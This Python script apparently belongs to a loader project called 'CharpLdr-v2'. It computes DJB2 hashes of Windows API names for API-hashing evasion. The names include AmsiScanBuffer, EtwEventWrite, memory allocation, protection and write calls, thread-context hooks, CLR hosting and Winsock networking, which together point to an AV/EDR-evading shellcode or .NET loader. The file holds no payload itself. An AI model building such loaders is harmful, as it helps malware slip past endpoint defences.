#!/usr/bin/env python3
"""
DJB2 hash generator for CharpLdr-v2.
Produces the same hashes as hash.h (constexpr djb2_hash).
Seed: 5381, uint32_t (masked & 0xFFFFFFFF), ASCII raw.
"""

def djb2_hash(name: str) -> int:
    """Case-sensitive DJB2 hash (for function names)."""
    h = 5381
    for c in name.encode('ascii'):
        h = ((h << 5) + h + c) & 0xFFFFFFFF
    return h

def djb2_hash_ci(name: str) -> int:
    """Case-insensitive DJB2 hash (for DLL names)."""
    h = 5381
    for c in name.lower().encode('ascii'):
        h = ((h << 5) + h + c) & 0xFFFFFFFF
    return h

# All function/DLL names used in the project
DLL_NAMES = [
    "ntdll.dll",
    "kernel32.dll",
    "kernelbase.dll",
    "ws2_32.dll",
    "mscoree.dll",
    "amsi.dll",
    "advapi32.dll",
]

FUNCTION_NAMES = {
    "ntdll": [
        "LdrLoadDll",
        "RtlInitUnicodeString",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtFreeVirtualMemory",
        "NtOpenSection",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtClose",
        "NtQueryInformationProcess",
        "TpAllocWork",
        "TpPostWork",
        "TpReleaseWork",
        "EtwEventWrite",
        "NtOpenFile",
        "NtCreateSection",
        "RtlGetVersion",
        "NtWaitForSingleObject",
    ],
    "kernel32": [
        "GetThreadContext",
        "SetThreadContext",
        "GetCurrentThread",
        "AddVectoredExceptionHandler",
        "RemoveVectoredExceptionHandler",
        "GetCurrentProcess",
    ],
    "ws2_32": [
        "WSAStartup",
        "socket",
        "connect",
        "send",
        "recv",
        "select",
        "closesocket",
        "WSACleanup",
        "getaddrinfo",
        "freeaddrinfo",
    ],
    "mscoree": [
        "CLRCreateInstance",
    ],
    "amsi": [
        "AmsiScanBuffer",
    ],
}

def main():
    print("=" * 70)
    print("CharpLdr-v2 DJB2 Hash Table")
    print("Seed: 5381 | Type: uint32_t | Encoding: ASCII raw")
    print("=" * 70)

    print("\n--- DLL name hashes (case-insensitive) ---")
    for dll in DLL_NAMES:
        h = djb2_hash_ci(dll)
        varname = f"HASH_{dll.replace('.dll','').upper()}"
        print(f"  {varname:<30s} = 0x{h:08X}  ({h:>10d})  // {dll}")

    print("\n--- Function hashes (case-sensitive) ---")
    for dll, funcs in FUNCTION_NAMES.items():
        print(f"\n  [{dll}]")
        for fn in funcs:
            h = djb2_hash(fn)
            varname = f"HASH_{fn}"
            print(f"    {varname:<40s} = 0x{h:08X}  ({h:>10d})")

    # Verification: check for hash collisions
    print("\n--- Collision check ---")
    all_hashes = {}
    for dll, funcs in FUNCTION_NAMES.items():
        for fn in funcs:
            h = djb2_hash(fn)
            if h in all_hashes:
                print(f"  [!] COLLISION: {fn} and {all_hashes[h]} -> 0x{h:08X}")
            else:
                all_hashes[h] = fn
    if len(all_hashes) == sum(len(v) for v in FUNCTION_NAMES.values()):
        print("  [+] No collisions detected.")

    # Output C++ header snippet
    print("\n--- C++ constexpr verification (paste to check) ---")
    print("// These should match hash.h values at compile time:")
    for fn in ["NtAllocateVirtualMemory", "LdrLoadDll", "AmsiScanBuffer", "EtwEventWrite"]:
        h = djb2_hash(fn)
        print(f"static_assert(djb2_hash(\"{fn}\") == 0x{h:08X}u, \"hash mismatch\");")

if __name__ == "__main__":
    main()
